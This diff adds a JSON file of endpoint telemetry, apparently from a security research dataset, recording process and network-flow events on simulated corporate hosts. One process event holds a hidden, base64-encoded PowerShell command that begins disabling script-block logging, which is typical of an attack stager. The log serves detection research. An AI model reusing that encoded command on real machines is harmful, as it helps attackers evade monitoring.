@@ -1,0 +1,111 @@
+[
+  {
+    "action": "CREATE",
+    "actorID": "3081546e-baf9-4047-b94b-765750e63b31",
+    "hostname": "SysClient0051.systemia.com",
+    "id": "e1d1e64f-b418-45e6-bc3a-fea857a367f1",
+    "object": "PROCESS",
+    "objectID": "3360bc38-784d-422d-9899-779f0e558da9",
+    "pid": 5664,
+    "ppid": 5032,
+    "principal": "SYSTEMIACOM\\dcoombes",
+    "properties": {
+      "acuity_level": "1",
+      "command_line": "\"\\\\?\\C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\" -marionette -profile C:\\Users\\dcoombes\\AppData\\Local\\Temp\\rust_mozprofile.53pdfRlWrpEI",
+      "image_path": "\\\\?\\C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
+      "parent_image_path": "\\Device\\HarddiskVolume1\\Windows\\system32\\conhost.exe",
+      "sid": "S-1-5-21-4190936083-3304963419-1584388968-3196",
+      "user": "SYSTEMIACOM\\dcoombes"
+    },
+    "tid": -1,
+    "timestamp": "2019-09-25T14:21:31.546-04:00"
+  },
+  {
+    "action": "CREATE",
+    "actorID": "af6b49d5-f648-41a4-946d-d92b174bae47",
+    "hostname": "SysClient0201.systemia.com",
+    "id": "43fb9623-3cd1-45ec-ab22-dbe46e75240e",
+    "object": "PROCESS",
+    "objectID": "96913629-c1c9-4503-9586-4a91de0e7311",
+    "pid": 5452,
+    "ppid": 1284,
+    "principal": "SYSTEMIACOM\\zleazer",
+    "properties": {
+      "acuity_level": "1",
+      "command_line": "powershell  -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAUwBJAG8ATgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAcwBzAEUATQBiAEwAeQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAEkAZQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHs",
+      "image_path": "powershell.exe",
+      "parent_image_path": "\\Device\\HarddiskVolume1\\Windows\\system32\\cmd.exe",
+      "sid": "S-1-5-21-4190936083-3304963419-1584388968-3346",
+      "user": "SYSTEMIACOM\\zleazer"
+    },
+    "tid": -1,
+    "timestamp": "2019-09-23T11:23:55.857-04:00"
+  },
+  {
+    "action": "START",
+    "actorID": "26c89c38-756b-4ad0-ab3a-0b1af7345475",
+    "hostname": "SysClient0201.systemia.com",
+    "id": "9bcea60a-d719-499e-aac1-710860b10ca1",
+    "object": "FLOW",
+    "objectID": "8973ed69-7597-466c-90fb-c3d327b1e5e6",
+    "pid": 760,
+    "ppid": 560,
+    "principal": "NT AUTHORITY\\NETWORK SERVICE",
+    "properties": {
+      "acuity_level": "1",
+      "dest_ip": "142.20.57.147",
+      "dest_port": "135",
+      "direction": "outbound",
+      "image_path": "\\Device\\HarddiskVolume1\\Windows\\system32\\svchost.exe",
+      "l4protocol": "6",
+      "src_ip": "142.20.56.202",
+      "src_port": "51396"
+    },
+    "tid": -1,
+    "timestamp": "2019-09-23T13:19:42.119-04:00"
+  },
+  {
+    "action": "START",
+    "actorID": "26c89c38-756b-4ad0-ab3a-0b1af7345475",
+    "hostname": "SysClient0201.systemia.com",
+    "id": "af9c662b-4a8d-4fff-899c-943da47e89a0",
+    "object": "FLOW",
+    "objectID": "4db0eec2-1750-4bfc-a135-7e291bb66c98",
+    "pid": 760,
+    "ppid": 560,
+    "principal": "NT AUTHORITY\\NETWORK SERVICE",
+    "properties": {
+      "acuity_level": "1",
+      "dest_ip": "142.20.57.147",
+      "dest_port": "135",
+      "direction": "outbound",
+      "image_path": "\\Device\\HarddiskVolume1\\Windows\\system32\\svchost.exe",
+      "l4protocol": "6",
+      "src_ip": "142.20.56.202",
+      "src_port": "51395"
+    },
+    "tid": -1,
+    "timestamp": "2019-09-23T13:19:42.104-04:00"
+  },
+  {
+    "action": "CREATE",
+    "actorID": "b743ac7a-c54f-4770-8b73-136c6800fc15",
+    "hostname": "SysClient0414.systemia.com",
+    "id": "99b4d49c-1c6b-4a6c-84d2-ce4e161cd21b",
+    "object": "PROCESS",
+    "objectID": "571e5f70-710e-4fdb-97dd-ac3cdc2159a5",
+    "pid": 2296,
+    "ppid": -1,
+    "principal": "",
+    "properties": {
+      "acuity_level": "1",
+      "command_line": "WmiPrvSE.exe",
+      "image_path": "WmiPrvSE.exe",
+      "parent_image_path": "\\Device\\HarddiskVolume1\\Windows\\system32\\svchost.exe",
+      "sid": "S-1-5-18",
+      "user": "NT AUTHORITY\\SYSTEM"
+    },
+    "tid": -1,
+    "timestamp": "2019-09-18T15:38:13.37-04:00"
+  }
+]
